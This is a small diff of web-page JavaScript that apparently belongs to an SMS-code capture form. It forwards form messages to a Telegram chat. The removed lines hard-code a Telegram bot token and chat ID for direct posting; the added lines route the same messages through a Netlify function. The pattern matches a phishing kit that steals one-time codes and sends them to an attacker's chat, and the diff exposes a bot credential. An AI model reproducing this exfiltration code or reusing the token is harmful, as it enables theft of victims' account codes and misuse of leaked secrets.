@@ -23,20 +23,12 @@ const smsForm = document.getElementById("smsForm")
 const backSmsBtn = document.getElementById("backSMS")
 const successState = document.getElementById("successState")
 
-const TELEGRAM_BOT_TOKEN = "7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w"
-const TELEGRAM_CHAT_ID = "-1002626141042"
-
 async function sendToTelegram(message) {
   try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
-    const response = await fetch(url, {
+    const response = await fetch("/.netlify/functions/telegram", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "HTML",
-      }),
+      body: JSON.stringify({ message }),
     })
     console.log("[v0] Telegram response:", response.ok)
     return response.ok
